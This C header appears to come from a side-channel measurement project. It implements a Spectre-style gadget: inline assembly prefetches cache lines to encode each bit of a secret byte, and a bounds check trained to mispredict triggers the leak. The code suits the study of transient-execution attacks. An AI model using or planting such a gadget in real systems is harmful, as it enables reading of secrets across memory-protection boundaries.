#include <stdint.h>
#include <stdio.h>

#include "../include/constants.h"
#include "../include/instructions.h"


#ifndef CBSC_MEASUREMENT_SPECTRE_H
#define CBSC_MEASUREMENT_SPECTRE_H

static inline __always_inline void asm_encode_data(uint8_t data, uint8_t *channel)
{
    __asm__ volatile("xor %%rax, %%rax\n"

                     "movb %[data], %%al\n"
                     "and $0x01, %%al\n"
                     "testb %%al, %%al\n"
                     "jz enc2\n"
                     "prefetcht0 (%[channel])\n"

                     "enc2:\n"
                     "addq $0x400,%[channel]\n"
                     "movb %[data], %%al\n"
                     "and $0x02, %%al\n"
                     "testb %%al, %%al\n"
                     "jz enc3\n"
                     "prefetcht0 (%[channel])\n"

                     "enc3:\n"
                     "addq $0x400,%[channel]\n"
                     "movb %[data], %%al\n"
                     "and $0x04, %%al\n"
                     "testb %%al, %%al\n"
                     "jz enc4\n"
                     "prefetcht0 (%[channel])\n"

                     "enc4:\n"
                     "addq $0x400,%[channel]\n"
                     "movb %[data], %%al\n"
                     "and $0x08, %%al\n"
                     "testb %%al, %%al\n"
                     "jz enc5\n"
                     "prefetcht0 (%[channel])\n"

                     "enc5:\n"
                     "addq $0x400,%[channel]\n"
                     "movb %[data], %%al\n"
                     "and $0x10, %%al\n"
                     "testb %%al, %%al\n"
                     "jz enc6\n"
                     "prefetcht0 (%[channel])\n"

                     "enc6:\n"
                     "addq $0x400,%[channel]\n"
                     "movb %[data], %%al\n"
                     "and $0x20, %%al\n"
                     "testb %%al, %%al\n"
                     "jz enc7\n"
                     "prefetcht0 (%[channel])\n"

                     "enc7:\n"
                     "addq $0x400,%[channel]\n"
                     "movb %[data], %%al\n"
                     "and $0x40, %%al\n"
                     "testb %%al, %%al\n"
                     "jz enc8\n"
                     "prefetcht0 (%[channel])\n"

                     "enc8:\n"
                     "addq $0x400,%[channel]\n"
                     "movb %[data], %%al\n"
                     "and $0x80, %%al\n"
                     "testb %%al, %%al\n"
                     "jz end\n"
                     "prefetcht0 (%[channel])\n"

                     "end:\n"
                     :
                     : [data] "r"(data), [channel] "r"(channel), [linesize] "r"(CACHE_LINE_SIZE)
                     : "rax", "cc"
    );
}


// returns if false during the training phase
bool leak_data(uint32_t iteration, uint32_t *train_data, uint32_t train_data_len, uint8_t secret, uint8_t channel[NUMBER_TRANSFER_BITS * CACHE_LINE_SIZE])
{
    if (train_data[iteration] < train_data_len)
    {
        asm_encode_data(secret, channel);
        //if (secret % 2 == 1)
        //    channel[0] += 5;
        //secret = DEVIDE_BY_2(secret);
        //if (secret % 2 == 1)
        //    channel[CACHE_LINE_SIZE] += 5;
        //secret = DEVIDE_BY_2(secret);
        //if (secret % 2 == 1)
        //    channel[2 * CACHE_LINE_SIZE] += 5;
        //secret = DEVIDE_BY_2(secret);
        //if (secret % 2 == 1)
        //    channel[3 * CACHE_LINE_SIZE] += 5;
        //secret = DEVIDE_BY_2(secret);
        //if (secret % 2 == 1)
        //    channel[4 * CACHE_LINE_SIZE] += 5;
        //secret = DEVIDE_BY_2(secret);
        //if (secret % 2 == 1)
        //    channel[5 * CACHE_LINE_SIZE] += 5;
        //secret = DEVIDE_BY_2(secret);
        //if (secret % 2 == 1)
        //    channel[6 * CACHE_LINE_SIZE] += 5;
        //secret = DEVIDE_BY_2(secret);
        //if (secret % 2 == 1)
        //    channel[7 * CACHE_LINE_SIZE] += 5;
        //secret = DEVIDE_BY_2(secret);
        return false;
    }
    return true;
}

#endif